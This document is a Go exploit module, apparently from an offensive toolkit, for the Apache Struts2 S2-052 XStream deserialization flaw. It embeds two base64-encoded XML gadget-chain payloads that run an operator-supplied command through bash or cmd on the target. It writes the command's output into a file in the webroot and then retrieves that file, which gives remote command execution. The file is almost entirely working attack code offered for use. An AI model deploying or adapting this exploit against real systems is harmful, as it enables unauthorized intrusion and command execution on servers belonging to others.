package exp_Struts2

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_S2_052 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_052) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	headers["Content-Type"] = []string{"application/xml"}
	cmd = cmd + ">./webapps/ROOT/101864180.txt 2>&1"
	cmd = url.PathEscape(cmd)

	linuxShellPayload := "PG1hcD4KICA8ZW50cnk+CiAgICA8amRrLm5hc2hvcm4uaW50ZXJuYWwub2JqZWN0cy5OYXRpdmVTdHJpbmc+CiAgICAgIDxmbGFncz4wPC9mbGFncz4KICAgICAgPHZhbHVlIGNsYXNzPSJjb20uc3VuLnhtbC5pbnRlcm5hbC5iaW5kLnYyLnJ1bnRpbWUudW5tYXJzaGFsbGVyLkJhc2U2NERhdGEiPgogICAgICAgIDxkYXRhSGFuZGxlcj4KICAgICAgICAgIDxkYXRhU291cmNlIGNsYXNzPSJjb20uc3VuLnhtbC5pbnRlcm5hbC53cy5lbmNvZGluZy54bWwuWE1MTWVzc2FnZSRYbWxEYXRhU291cmNlIj4KICAgICAgICAgICAgPGlzIGNsYXNzPSJqYXZheC5jcnlwdG8uQ2lwaGVySW5wdXRTdHJlYW0iPgogICAgICAgICAgICAgIDxjaXBoZXIgY2xhc3M9ImphdmF4LmNyeXB0by5OdWxsQ2lwaGVyIj4KICAgICAgICAgICAgICAgIDxpbml0aWFsaXplZD5mYWxzZTwvaW5pdGlhbGl6ZWQ+CiAgICAgICAgICAgICAgICA8b3Btb2RlPjA8L29wbW9kZT4KICAgICAgICAgICAgICAgIDxzZXJ2aWNlSXRlcmF0b3IgY2xhc3M9ImphdmF4LmltYWdlaW8uc3BpLkZpbHRlckl0ZXJhdG9yIj4KICAgICAgICAgICAgICAgICAgPGl0ZXIgY2xhc3M9ImphdmF4LmltYWdlaW8uc3BpLkZpbHRlckl0ZXJhdG9yIj4KICAgICAgICAgICAgICAgICAgICA8aXRlciBjbGFzcz0iamF2YS51dGlsLkNvbGxlY3Rpb25zJEVtcHR5SXRlcmF0b3IiLz4KICAgICAgICAgICAgICAgICAgICA8bmV4dCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgICAgICAgICAgIDxjb21tYW5kPgogICAgICAgICAgICAgICAgICAgICAgICA8c3RyaW5nPi9iaW4vYmFzaDwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgICA8c3RyaW5nPi1jPC9zdHJpbmc+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzdHJpbmc+bHo1MjA1MjA8L3N0cmluZz4KICAgICAgICAgICAgICAgICAgICAgIDwvY29tbWFuZD4KICAgICAgICAgICAgICAgICAgICAgIDxyZWRpcmVjdEVycm9yU3RyZWFtPmZhbHNlPC9yZWRpcmVjdEVycm9yU3RyZWFtPgogICAgICAgICAgICAgICAgICAgIDwvbmV4dD4KICAgICAgICAgICAgICAgICAgPC9pdGVyPgogICAgICAgICAgICAgICAgICA8ZmlsdGVyIGNsYXNzPSJqYXZheC5pbWFnZWlvLkltYWdlSU8kQ29udGFpbnNGaWx0ZXIiPgogICAgICAgICAgICAgICAgICAgIDxtZXRob2Q+CiAgICAgICAgICAgICAgICAgICAgICA8Y2xhc3M+amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyPC9jbGFzcz4KICAgICAgICAgICAgICAgICAgICAgIDxuYW1lPnN0YXJ0PC9uYW1lPgogICAgICAgICAgICAgICAgICAgICAgPHBhcmFtZXRlci10eXBlcy8+CiAgICAgICAgICAgICAgICAgICAgPC9tZXRob2Q+CiAgICAgICAgICAgICAgICAgICAgPG5hbWU+Zm9vPC9uYW1lPgogICAgICAgICAgICAgICAgICA8L2ZpbHRlcj4KICAgICAgICAgICAgICAgICAgPG5leHQgY2xhc3M9InN0cmluZyI+Zm9vPC9uZXh0PgogICAgICAgICAgICAgICAgPC9zZXJ2aWNlSXRlcmF0b3I+CiAgICAgICAgICAgICAgICA8bG9jay8+CiAgICAgICAgICAgICAgPC9jaXBoZXI+CiAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIkTnVsbElucHV0U3RyZWFtIi8+CiAgICAgICAgICAgICAgPGlidWZmZXI+PC9pYnVmZmVyPgogICAgICAgICAgICAgIDxkb25lPmZhbHNlPC9kb25lPgogICAgICAgICAgICAgIDxvc3RhcnQ+MDwvb3N0YXJ0PgogICAgICAgICAgICAgIDxvZmluaXNoPjA8L29maW5pc2g+CiAgICAgICAgICAgICAgPGNsb3NlZD5mYWxzZTwvY2xvc2VkPgogICAgICAgICAgICA8L2lzPgogICAgICAgICAgICA8Y29uc3VtZWQ+ZmFsc2U8L2NvbnN1bWVkPgogICAgICAgICAgPC9kYXRhU291cmNlPgogICAgICAgICAgPHRyYW5zZmVyRmxhdm9ycy8+CiAgICAgICAgPC9kYXRhSGFuZGxlcj4KICAgICAgICA8ZGF0YUxlbj4wPC9kYXRhTGVuPgogICAgICA8L3ZhbHVlPgogICAgPC9qZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmluZz4KICAgIDxqZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmluZyByZWZlcmVuY2U9Ii4uL2pkay5uYXNob3JuLmludGVybmFsLm9iamVjdHMuTmF0aXZlU3RyaW5nIi8+CiAgPC9lbnRyeT4KICA8ZW50cnk+CiAgICA8amRrLm5hc2hvcm4uaW50ZXJuYWwub2JqZWN0cy5OYXRpdmVTdHJpbmcgcmVmZXJlbmNlPSIuLi8uLi9lbnRyeS9qZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmluZyIvPgogICAgPGpkay5uYXNob3JuLmludGVybmFsLm9iamVjdHMuTmF0aXZlU3RyaW5nIHJlZmVyZW5jZT0iLi4vLi4vZW50cnkvamRrLm5hc2hvcm4uaW50ZXJuYWwub2JqZWN0cy5OYXRpdmVTdHJpbmciLz4KICA8L2VudHJ5Pgo8L21hcD4="
	windowShellPayload := "PG1hcD4KICA8ZW50cnk+CiAgICA8amRrLm5hc2hvcm4uaW50ZXJuYWwub2JqZWN0cy5OYXRpdmVTdHJpbmc+CiAgICAgIDxmbGFncz4wPC9mbGFncz4KICAgICAgPHZhbHVlIGNsYXNzPSJjb20uc3VuLnhtbC5pbnRlcm5hbC5iaW5kLnYyLnJ1bnRpbWUudW5tYXJzaGFsbGVyLkJhc2U2NERhdGEiPgogICAgICAgIDxkYXRhSGFuZGxlcj4KICAgICAgICAgIDxkYXRhU291cmNlIGNsYXNzPSJjb20uc3VuLnhtbC5pbnRlcm5hbC53cy5lbmNvZGluZy54bWwuWE1MTWVzc2FnZSRYbWxEYXRhU291cmNlIj4KICAgICAgICAgICAgPGlzIGNsYXNzPSJqYXZheC5jcnlwdG8uQ2lwaGVySW5wdXRTdHJlYW0iPgogICAgICAgICAgICAgIDxjaXBoZXIgY2xhc3M9ImphdmF4LmNyeXB0by5OdWxsQ2lwaGVyIj4KICAgICAgICAgICAgICAgIDxpbml0aWFsaXplZD5mYWxzZTwvaW5pdGlhbGl6ZWQ+CiAgICAgICAgICAgICAgICA8b3Btb2RlPjA8L29wbW9kZT4KICAgICAgICAgICAgICAgIDxzZXJ2aWNlSXRlcmF0b3IgY2xhc3M9ImphdmF4LmltYWdlaW8uc3BpLkZpbHRlckl0ZXJhdG9yIj4KICAgICAgICAgICAgICAgICAgPGl0ZXIgY2xhc3M9ImphdmF4LmltYWdlaW8uc3BpLkZpbHRlckl0ZXJhdG9yIj4KICAgICAgICAgICAgICAgICAgICA8aXRlciBjbGFzcz0iamF2YS51dGlsLkNvbGxlY3Rpb25zJEVtcHR5SXRlcmF0b3IiLz4KICAgICAgICAgICAgICAgICAgICA8bmV4dCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgICAgICAgICAgIDxjb21tYW5kPgogICAgICAgICAgICAgICAgICAgICAgICA8c3RyaW5nPmNtZDwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgICA8c3RyaW5nPi9jPC9zdHJpbmc+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzdHJpbmc+bHo1MjA1MjA8L3N0cmluZz4KICAgICAgICAgICAgICAgICAgICAgIDwvY29tbWFuZD4KICAgICAgICAgICAgICAgICAgICAgIDxyZWRpcmVjdEVycm9yU3RyZWFtPmZhbHNlPC9yZWRpcmVjdEVycm9yU3RyZWFtPgogICAgICAgICAgICAgICAgICAgIDwvbmV4dD4KICAgICAgICAgICAgICAgICAgPC9pdGVyPgogICAgICAgICAgICAgICAgICA8ZmlsdGVyIGNsYXNzPSJqYXZheC5pbWFnZWlvLkltYWdlSU8kQ29udGFpbnNGaWx0ZXIiPgogICAgICAgICAgICAgICAgICAgIDxtZXRob2Q+CiAgICAgICAgICAgICAgICAgICAgICA8Y2xhc3M+amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyPC9jbGFzcz4KICAgICAgICAgICAgICAgICAgICAgIDxuYW1lPnN0YXJ0PC9uYW1lPgogICAgICAgICAgICAgICAgICAgICAgPHBhcmFtZXRlci10eXBlcy8+CiAgICAgICAgICAgICAgICAgICAgPC9tZXRob2Q+CiAgICAgICAgICAgICAgICAgICAgPG5hbWU+Zm9vPC9uYW1lPgogICAgICAgICAgICAgICAgICA8L2ZpbHRlcj4KICAgICAgICAgICAgICAgICAgPG5leHQgY2xhc3M9InN0cmluZyI+Zm9vPC9uZXh0PgogICAgICAgICAgICAgICAgPC9zZXJ2aWNlSXRlcmF0b3I+CiAgICAgICAgICAgICAgICA8bG9jay8+CiAgICAgICAgICAgICAgPC9jaXBoZXI+CiAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIkTnVsbElucHV0U3RyZWFtIi8+CiAgICAgICAgICAgICAgPGlidWZmZXI+PC9pYnVmZmVyPgogICAgICAgICAgICAgIDxkb25lPmZhbHNlPC9kb25lPgogICAgICAgICAgICAgIDxvc3RhcnQ+MDwvb3N0YXJ0PgogICAgICAgICAgICAgIDxvZmluaXNoPjA8L29maW5pc2g+CiAgICAgICAgICAgICAgPGNsb3NlZD5mYWxzZTwvY2xvc2VkPgogICAgICAgICAgICA8L2lzPgogICAgICAgICAgICA8Y29uc3VtZWQ+ZmFsc2U8L2NvbnN1bWVkPgogICAgICAgICAgPC9kYXRhU291cmNlPgogICAgICAgICAgPHRyYW5zZmVyRmxhdm9ycy8+CiAgICAgICAgPC9kYXRhSGFuZGxlcj4KICAgICAgICA8ZGF0YUxlbj4wPC9kYXRhTGVuPgogICAgICA8L3ZhbHVlPgogICAgPC9qZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmluZz4KICAgIDxqZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmluZyByZWZlcmVuY2U9Ii4uL2pkay5uYXNob3JuLmludGVybmFsLm9iamVjdHMuTmF0aXZlU3RyaW5nIi8+CiAgPC9lbnRyeT4KICA8ZW50cnk+CiAgICA8amRrLm5hc2hvcm4uaW50ZXJuYWwub2JqZWN0cy5OYXRpdmVTdHJpbmcgcmVmZXJlbmNlPSIuLi8uLi9lbnRyeS9qZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmluZyIvPgogICAgPGpkay5uYXNob3JuLmludGVybmFsLm9iamVjdHMuTmF0aXZlU3RyaW5nIHJlZmVyZW5jZT0iLi4vLi4vZW50cnkvamRrLm5hc2hvcm4uaW50ZXJuYWwub2JqZWN0cy5OYXRpdmVTdHJpbmciLz4KICA8L2VudHJ5Pgo8L21hcD4="
	tmpBytes, _ := base64.StdEncoding.DecodeString(linuxShellPayload)
	linuxShellPayload = strings.Replace(string(tmpBytes), "lz520520", cmd, 1)
	tmpBytes, _ = base64.StdEncoding.DecodeString(windowShellPayload)
	windowShellPayload = strings.Replace(string(tmpBytes), "lz520520", cmd, 1)

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, linuxShellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	httpresp = self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, windowShellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	delete(headers, "Content-Type")
	tmpSlice := strings.Split(self.Params.BaseParam.Target, "/")
	target := strings.TrimSuffix(self.Params.BaseParam.Target, tmpSlice[len(tmpSlice)-1]) + "101864180.txt"
	//resultPath := strings.Split
	httpresp = self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_S2_052{}, "exp_S2_052.yml")
}
